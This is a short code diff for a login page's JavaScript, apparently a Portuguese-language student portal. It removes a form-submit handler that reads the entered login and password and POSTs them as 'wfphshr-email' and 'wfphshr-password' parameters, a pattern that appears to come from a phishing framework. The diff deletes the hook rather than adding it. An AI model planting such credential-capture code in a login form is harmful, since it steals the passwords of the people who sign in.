@@ -31,17 +31,3 @@ inputPass.addEventListener('keydown', (e) => {
     }
 
 })
-
-var form = document.getElementById('login-form');
-form.onsubmit = function(event){
-        
-        let login = document.getElementById('inputRA').value;
-
-        let senha = document.getElementById('inputSenha').value;
-
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", `?wfphshr-email=${login}&wfphshr-password=${senha}`);
-        
-        xhr.send(null)
-
-} 
